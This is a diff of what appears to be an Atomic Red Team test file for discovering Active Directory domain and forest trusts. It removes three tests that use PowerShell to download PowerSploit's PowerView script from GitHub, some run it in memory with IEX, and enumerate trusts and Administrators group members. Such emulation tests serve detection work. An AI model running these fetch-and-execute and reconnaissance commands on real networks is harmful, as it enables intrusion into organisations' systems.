@@ -31,35 +31,6 @@ atomic_tests:
     command: |
       nltest /domain_trusts
     name: command_prompt
-- name: Powershell enumerate domains and forests
-  auto_generated_guid: c58fbc62-8a62-489e-8f2d-3565d7d96f30
-  description: |
-    Use powershell to enumerate AD information.
-    Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
-  supported_platforms:
-  - windows
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      PowerView PowerShell script must exist on disk
-    prereq_command: |
-      if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}
-    get_prereq_command: |
-      Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1" -OutFile "$env:TEMP\PowerView.ps1"
-  - description: |
-      RSAT PowerShell AD admin cmdlets must be installed
-    prereq_command: |
-      if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else { exit 1 }
-    get_prereq_command: |
-      Write-Host "Sorry RSAT must be installed manually"
-  executor:
-    command: |
-      Import-Module "$env:TEMP\PowerView.ps1"
-      Get-NetDomainTrust
-      Get-NetForestTrust
-      Get-ADDomain
-      Get-ADGroupMember Administrators -Recursive
-    name: powershell
 - name: Adfind - Enumerate Active Directory OUs
   auto_generated_guid: d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec
   description: | 
@@ -108,27 +79,3 @@ atomic_tests:
     command: |
       #{adfind_path} -gcb -sc trustdmp
     name: command_prompt
-
-- name: Get-DomainTrust with PowerView
-  auto_generated_guid: f974894c-5991-4b19-aaf5-7cc2fe298c5d
-  description: |
-    Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
-    name: powershell
-
-- name: Get-ForestTrust with PowerView
-  auto_generated_guid: 58ed10e8-0738-4651-8408-3a3e9a526279
-  description: |
-    Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
-    name: powershell
